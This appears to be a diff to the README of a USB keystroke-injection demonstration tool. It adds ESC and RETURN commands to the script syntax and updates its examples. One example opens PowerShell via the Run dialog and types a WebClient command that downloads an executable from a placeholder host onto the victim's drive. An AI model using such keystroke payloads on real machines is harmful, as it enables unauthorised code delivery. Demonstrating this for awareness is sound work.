@@ -16,8 +16,10 @@ and presentations withing [ThinkArena](http://www.denkarena.ch/)
 
 The String can be of Keystrokes, Strings and Pause:
 * The `K:` is used to simulate a KeyStroke with a modifier key
-* The `S:` is used to write a string and send the ENTER key at the end
+* The `S:` is used to write a string
 * The `W:` is used to wait the given amount of milliseconds before the next line is processed
+* The `E` is used to send a ESC Keystroke
+* The `R` is used to send the RETURN/ENTER key
 
 **Example**
 
@@ -28,8 +30,11 @@ W: 50
 S: notepad
 W: 200
 S: You've just inserted a malicious USB-Stick.
+R
 S: Always take care about what you're connection
+R
 S: Cheers...
+R
 ```
 
 ### Downlaod in Windows
@@ -46,7 +51,9 @@ This would result in a String like this:
 K: WIN R
 W: 50
 S: powershell
+R
 S: $client = New-Object System.Net.WebClient
+R
 S: $client.DownloadFile("http://www.example.com/file.exe", "C:\")
 ```
 
